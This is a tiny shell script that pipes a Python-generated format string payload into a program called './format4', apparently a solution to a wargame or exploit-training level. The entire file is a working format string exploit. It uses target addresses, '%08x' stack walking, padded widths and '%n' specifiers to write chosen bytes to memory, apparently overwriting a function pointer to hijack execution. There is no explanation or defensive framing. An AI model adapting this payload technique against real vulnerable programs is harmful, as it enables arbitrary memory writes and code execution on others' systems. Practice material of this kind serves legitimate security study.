#!/bin/sh

python -c "print '\x24\x97\x04\x08'+'%08x'*2+'%159u+%n+__%%\x97\x04\x08'+'%08x'*4+'%168u+%n+___\x26\x97\x04\x08'+'%08x'*6+'%71u+%n+\x27\x97\x04\x08'+'%08x'*7+'%198u+%n+'" | ./format4